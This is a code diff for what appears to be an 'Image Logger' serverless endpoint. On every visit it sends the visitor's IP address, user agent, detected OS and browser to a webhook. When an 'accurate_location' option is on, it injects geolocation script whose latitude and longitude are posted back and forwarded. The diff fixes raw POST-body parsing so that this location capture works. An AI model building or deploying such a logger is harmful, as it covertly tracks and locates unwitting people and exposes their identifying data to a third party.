@@ -1,5 +1,3 @@
-// api/index.js
-
 const fetch = require("node-fetch");
 
 const config = {
@@ -33,8 +31,6 @@ function detectOSBrowser(ua) {
 
 async function sendWebhook(ip, useragent, lat, lon) {
   const { os, browser } = detectOSBrowser(useragent || "");
-
-  // Polished embed fields like Image Logger GUI
   const fields = [
     {
       name: "IP Info",
@@ -85,14 +81,20 @@ module.exports = async (req, res) => {
   const useragent = req.headers["user-agent"] || "";
 
   if (req.method === "POST") {
-    try {
-      const data = req.body;
-      await sendWebhook(data.ip, data.useragent, data.lat, data.lon);
-    } catch {}
-    res.status(200).send("OK");
+    // Parse raw body
+    let body = [];
+    req.on("data", chunk => body.push(chunk));
+    req.on("end", async () => {
+      try {
+        const data = JSON.parse(Buffer.concat(body).toString());
+        await sendWebhook(data.ip, data.useragent, data.lat, data.lon);
+      } catch {}
+      res.status(200).send("OK");
+    });
     return;
   }
 
+  // GET request
   await sendWebhook(ip, useragent);
 
   const geo_js = config.options.accurate_location ? `
